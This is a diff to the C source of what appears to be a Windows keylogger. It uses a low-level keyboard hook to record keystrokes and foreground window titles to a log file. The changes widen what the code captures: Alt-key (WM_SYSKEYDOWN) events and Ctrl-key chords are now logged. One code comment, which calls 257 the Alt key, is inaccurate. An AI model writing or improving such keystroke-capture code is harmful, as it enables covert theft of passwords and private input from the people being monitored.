@@ -25,7 +25,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
 
     if(!GetModuleFileName(NULL, modulePath, MAX_PATH))
     {
-        printf("Cannot install service (%d)\n", GetLastError());
+        printf("Cannot find module (%d)\n", GetLastError());
         return;
     }
     strncpy_s(moduleFolder, MAX_PATH, modulePath, getFolderStringLength(modulePath));
@@ -42,7 +42,6 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         int cTxtLen = GetWindowTextLength(foreground) + 1;
         windowTitle = LocalAlloc(LMEM_ZEROINIT, cTxtLen);
         GetWindowText(foreground, windowTitle, cTxtLen);
-
         if (!currentWindow || currentWindow != foreground)
         {
             currentWindow = foreground;
@@ -72,7 +71,14 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
         GetKeyboardState(keyboardState);
-        ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
+        // if control is up do not use tounicode to bypass control characters
+        if (GetKeyState(VK_CONTROL) || GetKeyState(VK_LCONTROL) || GetKeyState(VK_RCONTROL))
+        {
+            charString[0] = useUpperCase ? kbdStruct.vkCode : tolower(kbdStruct.vkCode);
+            charString[1] = '\0';
+        }
+        else
+            ToUnicodeEx(kbdStruct.vkCode, kbdStruct.scanCode, keyboardState, charString, 8, 0, GetKeyboardLayout(threadId));
     }
 
     WriteFile( 
@@ -120,7 +126,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	if (nCode < 0 || (wParam != WM_KEYUP && wParam != WM_KEYDOWN))
+	if (nCode < 0 || (wParam != WM_KEYUP && wParam != WM_KEYDOWN && wParam != WM_SYSKEYDOWN))
         return CallNextHookEx(_hook, nCode, wParam, lParam);
 
     KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
@@ -129,7 +135,8 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
         if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
             shiftIsHeld = FALSE;
     }
-	else if (wParam == WM_KEYDOWN)
+    // 257 is the alt key
+	else if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
 	{
         if (kbdStruct.vkCode == VK_SHIFT || kbdStruct.vkCode == VK_LSHIFT || kbdStruct.vkCode == VK_RSHIFT)
             shiftIsHeld = TRUE;
